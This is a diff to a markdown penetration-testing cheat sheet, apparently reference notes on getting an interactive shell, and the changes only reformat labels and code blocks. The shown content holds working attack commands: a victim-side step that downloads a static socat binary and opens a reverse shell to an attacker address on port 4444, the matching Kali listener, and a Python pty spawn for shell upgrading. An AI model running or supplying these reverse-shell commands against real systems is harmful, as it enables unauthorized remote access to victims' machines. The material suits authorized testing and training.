@@ -16,18 +16,24 @@ python -m SimpleHTTPServer 8888
 
 ### With Socat
 
-Victim: 
+**Victim:** 
 ```
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat
 chmod +x socat
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
 ```
         
-Kali:   ```socat file:`tty`,raw,echo=0 tcp-listen:4444```
+**Kali:**
+```
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+```
 
 ### With Python
 
-Victim: ```python3 -c 'import pty; pty.spawn("/bin/sh")'```
+**Victim:** 
+```
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+```
 
 ## Send files
 
